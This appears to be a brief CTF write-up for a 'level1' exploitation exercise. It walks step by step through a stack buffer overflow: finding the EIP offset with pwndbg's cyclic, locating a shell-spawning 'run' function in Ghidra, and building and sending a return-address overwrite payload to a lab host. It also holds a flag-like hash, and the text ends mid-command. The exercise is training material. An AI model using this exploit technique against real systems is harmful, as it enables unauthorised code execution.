level1:1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

use of pwndgb
find overwrite EIP at 76 char with `cyclic` cmd
`cyclic 100`
then get the 4 bytes caught in EIP and `cyclic -l taaa` to find offset

Using ghidra, find function named `run` that looks like running a shell
Try to overwrite EIP with its address `0x08048444`

generate the payload: `python2 -c 'print 76 * "A" + "\x44\x84\x04\x08"' > payload`

send the payload: `scp -P 4242 payload level1@192.168.1.88:/tmp/payload`

`cat /tmp/payload | ./level1` doesnt give a shell but prompts the string

We can do something like this to keep stdin opened `(echo test; cat) | cat 